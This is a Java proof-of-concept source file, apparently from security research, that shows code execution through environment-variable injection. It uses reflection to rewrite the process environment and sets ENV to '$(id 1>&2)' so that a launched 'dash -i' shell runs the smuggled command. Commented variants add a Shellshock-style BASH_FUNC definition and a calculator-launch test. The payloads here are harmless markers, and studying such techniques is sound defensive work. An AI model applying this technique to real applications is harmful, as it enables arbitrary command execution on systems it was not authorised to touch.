package com.venscor.jdni.vul;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

/**
 * @author wangyu07 <wangyu07@kuaishou.com>
 * Created on 2022-02-23
 */
public class EnvRCEVulTest {
    public static void main(String[] args) {

        System.setProperty("USER2", "4566");

        Properties properties = System.getProperties();
        properties.entrySet().stream().forEach(entry -> System.out.println(entry.getKey() + "=" + entry.getValue()));


        System.out.println("*******************************");


        Map<String, String> envs = System.getenv();

        Map<String, String> newEnvs = new HashMap<>(envs);
        //        newEnvs.put("BASH_FUNC_echo%%", "() { id; }");
        newEnvs.put("ENV", "$(id 1>&2)");

        try {
            setEnv(newEnvs);
        } catch (Exception e) {
            e.printStackTrace();
        }


        envs.forEach((k, v) -> System.out.println(k + "=" + v));


        System.out.println("***************env changed****************");

        Map<String, String> pEnv = new ProcessBuilder().environment();
        pEnv.forEach((k, v) -> System.out.println(k + "=" + v));

        System.out.println("%%%%%%%%%%%%exec code%%%%%%%%%%%%%%%%%");

        //        env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
        //        ENV='$(id 1>&2)' dash -i -c 'echo hello'

        try {
            //            String[] cmds = {"sh", "-c", "echo hello"};
            String[] cmds = {"dash", "-i", "-c", "echo hello"};
            Process p = Runtime.getRuntime().exec(cmds);
            //            Process p = Runtime.getRuntime().exec("sh -c 'open -a /System/Applications/Calculator.app'");

            byte[] buffer = new byte[1];

            InputStream inputStream = p.getInputStream();

            while (inputStream.read(buffer) != -1) {
                System.out.write(buffer);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    //非真实改变了系统环境变量，而是改变了当前进程的环境变量
    ///proc/PID/environ
    protected static void setEnv(Map<String, String> newEnv) throws Exception {
        try {
            Class<?> processEnvironmentClass = Class.forName("java.lang.ProcessEnvironment");
            Field theEnvironmentField = processEnvironmentClass.getDeclaredField("theEnvironment");
            theEnvironmentField.setAccessible(true);
            Map<String, String> env = (Map<String, String>) theEnvironmentField.get(null);
            env.putAll(newEnv);
            Field theCaseInsensitiveEnvironmentField =
                    processEnvironmentClass.getDeclaredField("theCaseInsensitiveEnvironment");
            theCaseInsensitiveEnvironmentField.setAccessible(true);
            Map<String, String> cienv = (Map<String, String>) theCaseInsensitiveEnvironmentField.get(null);
            cienv.putAll(newEnv);
        } catch (NoSuchFieldException e) {
            Class[] classes = Collections.class.getDeclaredClasses();
            Map<String, String> env = System.getenv();
            for (Class cl : classes) {
                if ("java.util.Collections$UnmodifiableMap".equals(cl.getName())) {
                    Field field = cl.getDeclaredField("m");
                    field.setAccessible(true);
                    Object obj = field.get(env);
                    Map<String, String> map = (Map<String, String>) obj;
                    map.clear();
                    map.putAll(newEnv);
                }
            }
        }
    }

}
